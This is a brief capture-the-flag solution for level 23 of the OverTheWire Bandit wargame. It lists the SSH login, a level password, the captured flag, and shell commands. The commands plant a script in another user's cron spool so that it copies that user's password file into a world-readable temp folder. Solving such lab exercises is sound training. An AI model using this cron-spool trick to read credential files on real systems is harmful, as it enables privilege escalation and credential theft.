login: ssh -p 2220 bandit23@bandit.labs.overthewire.org
pwd: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

```
mkdir /tmp/patryk2
cd /tmp/patryk2
ls /etc/cron.d
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
touch script.sh
echo "#!/bin/bash" > script.sh
echo "cat /etc/bandit_pass/bandit24 > /tmp/patryk2/pass.txt" >> script.sh
touch pass.txt
chmod 777 /tmp/patryk2
chmod 777 *
ls -la
cp script.sh /var/spool/bandit24/foo
cat pass.txt
```

flag: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar